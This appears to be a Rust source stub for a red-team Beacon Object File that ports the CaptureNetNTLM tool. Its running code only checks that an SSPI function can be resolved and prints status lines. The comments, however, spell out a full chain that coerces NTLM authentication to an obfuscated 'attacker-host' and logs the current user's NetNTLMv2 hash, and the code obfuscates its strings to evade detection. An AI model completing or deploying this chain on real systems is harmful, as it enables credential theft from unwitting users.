// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
// Original C: REDMED-X/OperatorsKit — CaptureNetNTLM
//
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique {
        id: "T1187",
        name: "Forced Authentication",
        tactic: "Credential Access",
    },
    Technique {
        id: "T1557.001",
        name: "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning",
        tactic: "Credential Access",
    },
];

// Phase 4 stub. Full chain (Phase 5+):
//   1. AcquireCredentialsHandleW(
//          NULL,                           // pszPrincipal
//          OBF("NTLM"),                    // pszPackage (never in .rdata)
//          SECPKG_CRED_OUTBOUND = 0x2,
//          NULL,                           // pvLogonId
//          NULL,                           // pAuthData
//          NULL, NULL,                     // pGetKeyFn, pvGetKeyArgument
//          &cred_handle,
//          NULL,                           // ptsExpiry
//      )
//   2. InitializeSecurityContextW(
//          &cred_handle, NULL,
//          OBF("\\\\attacker-host"),        // pszTargetName
//          ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY,
//          0, SECURITY_NATIVE_DREP,
//          NULL, 0,
//          &ctx_handle, &out_buf_desc,
//          &ctx_attrs, NULL,
//      )  → emits NTLM Type-1 negotiate blob
//   3. Send Type-1 blob over SMB/HTTP to operator host
//   4. Receive Type-2 challenge blob from operator host
//   5. InitializeSecurityContextW (second call) with Type-2 as input
//      → emits NTLM Type-3 (contains NetNTLMv2 hash of current user)
//   6. Hex-encode the NTLMSSP blob → beacon-log the hash
//   7. DeleteSecurityContext + FreeCredentialsHandle cleanup

// AcquireCredentialsHandleW takes 9 args — more than the dfr_fn! macro supports
// as a real call, so we only verify the cleanup entrypoint (FreeCredentialsHandle)
// to confirm secur32.dll is reachable. The full AcquireCredentialsHandleW call
// is deferred to Phase 5+ where it will be issued via raw function-pointer cast.
dfr_fn!(
    free_credentials_handle(handle: *mut u8) -> i32,
    module = "secur32.dll",
    api    = "FreeCredentialsHandle"
);

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {}
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    // Verify SSPI endpoint reachable: pass null handle — FreeCredentialsHandle
    // returns SEC_E_INVALID_HANDLE for null input but we only care the DFR
    // symbol resolution succeeded.
    let _ = unsafe { free_credentials_handle(core::ptr::null_mut()) };

    println!("[+] {}", obf!("SSPI endpoint ready"));
    println!("[*] {}", obf!("NTLM coerce chain documented in source"));
    println!("[*] {}", obf!("Phase 5+ AcquireCredentialsHandle + InitializeSecurityContext"));
    Ok(())
}
